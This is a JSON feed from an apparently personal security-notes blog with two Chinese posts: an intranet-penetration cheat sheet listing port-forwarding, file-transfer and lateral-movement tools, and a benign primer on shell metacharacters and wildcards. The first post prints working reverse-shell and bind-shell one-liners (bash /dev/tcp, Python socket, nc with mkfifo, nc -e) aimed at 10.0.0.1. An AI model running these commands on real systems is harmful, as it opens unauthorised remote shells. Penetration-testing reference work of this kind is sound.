{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"shell\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/",
            "title": "综合技巧",
            "date_published": "2022-11-29T07:50:20.000Z",
            "content_html": "<h1 id=\"端口转发\"><a class=\"anchor\" href=\"#端口转发\">#</a> 端口转发</h1>\n<ul>\n<li>\n<p>windows</p>\n<ul>\n<li>lcx</li>\n<li>netsh</li>\n</ul>\n</li>\n<li>\n<p>linux</p>\n<ul>\n<li>portmap</li>\n<li>iptables</li>\n</ul>\n</li>\n<li>\n<p>socket 代理</p>\n<ul>\n<li>Win: xsocks</li>\n<li>Linux: proxychains</li>\n</ul>\n</li>\n<li>\n<p>基于 http 的转发与 socket 代理 (低权限下的渗透)</p>\n<ul>\n<li>端口转发: tunnasocks 代理: reGeorg</li>\n</ul>\n</li>\n<li>\n<p>ssh 通道</p>\n<ul>\n<li>端口转发 socks</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"获取shell\"><a class=\"anchor\" href=\"#获取shell\">#</a> 获取 shell</h1>\n<ul>\n<li>常规 shell 反弹</li>\n</ul>\n<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\n</code></pre>\n<ul>\n<li>突破防火墙的 imcp_shell 反弹</li>\n<li>正向 shell</li>\n</ul>\n<pre><code>nc -e /bin/sh -lp 1234\nnc.exe -e cmd.exe -lp 1234\n</code></pre>\n<h1 id=\"内网文件传输\"><a class=\"anchor\" href=\"#内网文件传输\">#</a> 内网文件传输</h1>\n<ul>\n<li>\n<p>windows 下文件传输</p>\n<ul>\n<li>powershell</li>\n<li>vbs 脚本文件</li>\n<li>bitsadmin</li>\n<li>文件共享</li>\n<li>使用 telnet 接收数据</li>\n<li>hta</li>\n</ul>\n</li>\n<li>\n<p>linux 下文件传输</p>\n<ul>\n<li>python</li>\n<li>wget</li>\n<li>tar + ssh</li>\n<li>利用 dns 传输数据</li>\n</ul>\n</li>\n<li>\n<p>文件编译</p>\n<ul>\n<li>powershell 将 exe 转为 txt，再 txt 转为 exe</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"远程连接-执行程序\"><a class=\"anchor\" href=\"#远程连接-执行程序\">#</a> 远程连接 &amp;&amp; 执行程序</h1>\n<ul>\n<li>at&amp;schtasks</li>\n<li>psexec</li>\n<li>wmic</li>\n<li>wmiexec.vbs</li>\n<li>smbexec</li>\n<li>powershell remoting</li>\n<li>SC 创建服务执行</li>\n<li>schtasks</li>\n<li>SMB+MOF || DLL Hijacks</li>\n<li>PTH + compmgmt.msc</li>\n</ul>\n",
            "tags": [
                "代理",
                "Shell",
                "远程连接"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/",
            "title": "Shell",
            "date_published": "2022-11-28T02:48:11.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。</p>\n<p>Linux 包含多种 Shell ，常见的有：</p>\n<ul>\n<li>Bourne Shell（ATT 的 Bourne 开发，名为 sh）</li>\n<li>Bourne Again Shell（/bin/bash）</li>\n<li>C Shell（Bill Joy 开发，名为 csh）</li>\n<li>K Shell（ATT 的 David G.koun 开发，名为 ksh）</li>\n<li>Z Shell（Paul Falstad 开发，名为 zsh）</li>\n</ul>\n<h1 id=\"元字符\"><a class=\"anchor\" href=\"#元字符\">#</a> 元字符</h1>\n<p>shell 一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的 Shell 支持的元字符可能会不相同。</p>\n<p>常见的元字符如下：</p>\n<ul>\n<li><code>IFS</code>  由 &lt;space&gt; 或 &lt;tab&gt; 或 &lt;enter&gt; 三者之一组成</li>\n<li><code>CR</code>  由 &lt;enter&gt; 产生。</li>\n<li><code>=</code>  设定变量</li>\n<li><code>$</code>  作变量或运算替换</li>\n<li><code>&gt;</code>  重定向 stdout</li>\n<li><code>&gt;&gt;</code>  追加到文件</li>\n<li><code>&lt;</code>  重定向 stdin</li>\n<li><code>|</code>  命令管道</li>\n<li><code>&amp;</code>  后台执行命令</li>\n<li><code>;</code>  在前一个命令结束后，执行下一个命令</li>\n<li><code>&amp;&amp;</code>  在前一个命令未报错执行后，执行下一个命令</li>\n<li><code>||</code>  在前一个命令执行报错后，执行下一个命令</li>\n<li><code>'</code>  在单引号内的命令会保留原来的值</li>\n<li><code>&quot;</code>  在双引号内的命令会允许变量替换</li>\n<li><code>`</code>  在反引号内的内容会当成命令执行并替换</li>\n<li><code>()</code>  在子 Shell 中执行命令</li>\n<li><code>&#123;&#125;</code>  在当前 Shell 中执行命令</li>\n<li><code>~</code>  当前用户的主目录</li>\n<li><code>!number</code>  执行历史命令，如  <code>!1</code></li>\n</ul>\n<h1 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h1>\n<p>除元字符外，通配符（wildcard）也是 shell 中的一种特殊字符。当 shell 在参数中遇到了通配符时，shell 会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。</p>\n<p>常见的通配符如下：</p>\n<ul>\n<li><code>*</code>  匹配 0 或多个字符</li>\n<li><code>?</code>  匹配任意一个字符</li>\n<li><code>[list]</code>  匹配 list 中的任意一个字符</li>\n<li><code>[!list]</code>  匹配除 list 外的任意一个字符</li>\n<li><code>[a-c]</code>  匹配 a-c 中的任意一个字符</li>\n<li><code>&#123;string1,string2,...&#125;</code>  分别匹配其中字符串</li>\n</ul>\n",
            "tags": [
                "Shell",
                "Linux"
            ]
        }
    ]
}